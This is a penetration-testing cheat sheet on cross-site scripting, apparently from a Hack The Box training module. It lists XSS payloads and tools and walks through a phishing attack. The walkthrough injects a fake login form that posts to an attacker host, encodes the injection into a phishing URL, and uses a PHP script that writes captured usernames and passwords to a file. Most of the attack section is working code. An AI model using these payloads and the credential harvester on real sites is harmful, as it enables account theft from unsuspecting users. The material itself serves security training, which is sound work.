#### Payloads
Basic payload
```html
<script>alert(window.origin)</script>
```

Basic payload to display cookie
```html
<script>alert(document.cookie)</script>
```

Payload in case alert() is blocked. Stops rendering HTML and turns it into plaintext.
```html
<script><plaintext></script>
```

Payload to pop up browser print dialog (unlikely to be browser-blocked)
```html
<script>print()</script>
```

Payload that does not contain \<script> tag (useful for DOM attacks). Creates new HTML image object with an onerror that triggers when the image cannot be found:
```html
<img src="" onerror=alert(window.origin)>
```
##### More Payloads
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or [PayloadBox](https://github.com/payloadbox/xss-payload-list)
#### Tools
 [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)

#### Exploit Example
This example was used in HTB's XSS module as an example of how to phish using an XSS exploit.

Example HTML of a basic form
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

XSS script used to test for XSS on the img display page (begins with a closing tag to close the IMG tag, and ends with the beginning of a comment to inactivate the rest of the HTML on page)
```HTML
"'><script>alert(window.origin)</script><!--
```

XSS script used to (1) inject a basic form, (2) have the form submit to our controlled server on port 800, (3) remove the display of the URL textbox on the original img display page that has the id 'urlform':
```html
"'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.3:800><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

Phishing URL to be sent to victim with the XSS script embedded to execute on the img display page:
```url
http://10.129.231.158/phishing/index.php?url=%22%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.3:800%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

The index.php needed to capture phished credentials:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

The command to start a php server to use the index.php created:
```shell
$ sudo php -S 0.0.0.0:800
```

